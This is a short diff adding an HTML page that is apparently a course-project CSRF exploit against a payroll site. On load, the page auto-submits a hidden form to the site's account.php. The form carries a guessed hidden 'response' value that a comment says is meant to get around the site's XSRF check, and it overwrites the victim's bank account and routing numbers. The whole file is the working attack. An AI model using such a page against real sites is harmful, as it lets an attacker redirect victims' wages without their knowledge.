@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<!-- the idea is to submit the corrent hidden respnse value to circumvent XSRF check from index.php-->
+<body onload='document.forms[0].submit();'>
+<form action='http://payroll.gatech.edu/account.php' method='POST'>
+<input type='hidden' name='response' value='11551'/>
+<input type='hidden' name='action' value='save'/>
+<input type='hidden' name='account' value='2133721337'/>
+<input type='hidden' name='routing' value='4242424242'/>
+</form>
+</body>
+</html>
